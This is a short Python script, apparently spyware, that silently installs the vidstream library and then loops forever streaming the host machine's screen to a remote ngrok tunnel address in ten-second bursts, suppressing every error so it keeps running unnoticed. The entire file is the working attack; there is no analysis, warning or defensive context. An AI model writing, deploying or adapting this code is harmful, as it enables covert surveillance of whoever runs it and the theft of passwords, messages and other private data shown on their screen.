####################################################################
try:
    from vidstream import ScreenShareClient
    import time
except:
    import subprocess
    subprocess.run("pip install vidstream")
####################################################################


####################################################################
while(True):
    try:
        Client = ScreenShareClient("0.tcp.sa.ngrok.io",11992)
        Client.start_stream()
        time.sleep(10)
        Client.stop_stream()
    except:pass
####################################################################
